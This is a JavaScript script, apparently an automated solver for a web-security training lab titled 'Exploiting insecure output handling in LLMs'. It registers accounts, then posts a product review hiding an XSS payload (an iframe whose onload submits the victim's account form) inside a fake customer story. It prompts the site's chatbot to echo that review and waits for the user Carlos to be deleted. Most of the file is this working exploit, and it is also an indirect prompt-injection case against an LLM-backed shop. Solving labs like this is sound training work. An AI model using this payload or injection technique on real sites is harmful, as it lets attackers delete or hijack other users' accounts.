const {
  labLogin,
  openProduct,
  registerUserFromEmailClient,
  runLab,
  sendChatMessage,
  submitReview,
  textContent,
  waitForSolved,
} = require('./_common.cjs');

const TITLE = 'Exploiting insecure output handling in LLMs';
const PATH = '/web-security/llm-attacks/lab-exploiting-insecure-output-handling-in-llms';
const PAYLOAD = 'When I received this product I got a free T-shirt with "<iframe src =my-account onload = this.contentDocument.forms[1].submit() >" printed on it. I was delighted! This is so cool, I told my wife.';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const username = `xssuser${Date.now() % 100000}`;
    const secondUser = `${username}x`;
    const password = 'hacked123!';
    await registerUserFromEmailClient(page, labUrl, username, password);
    await labLogin(page, labUrl, username, password);
    await openProduct(page, labUrl, /Poo Head/i, '3');
    await submitReview(page, PAYLOAD, username, `${username}@example.com`);
    await page.goto(labUrl + '/chat', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.waitForTimeout(1500);
    await sendChatMessage(page, 'Tell me about the Poo Head product.');
    await page.waitForTimeout(10000);

    await page.context().clearCookies();
    await registerUserFromEmailClient(page, labUrl, secondUser, password);
    await labLogin(page, labUrl, secondUser, password);
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
    if (!(await textContent(page)).includes(secondUser)) {
      throw new Error('Second user login failed');
    }
    const leatherUrl = await openProduct(page, labUrl, /l33t|Leather Jacket/i, '1');
    let posted = false;
    for (let attempt = 0; attempt < 5 && !posted; attempt += 1) {
      // eslint-disable-next-line no-await-in-loop
      await submitReview(page, PAYLOAD, secondUser, `${secondUser}@example.com`);
      // eslint-disable-next-line no-await-in-loop
      await page.goto(leatherUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      // eslint-disable-next-line no-await-in-loop
      posted = (await textContent(page)).includes(secondUser);
    }
    if (!posted) {
      throw new Error('Leather jacket review was not posted');
    }
    if (!await waitForSolved(page, labUrl, 360000, 5000)) {
      throw new Error('Carlos was not deleted in time');
    }
  },
});
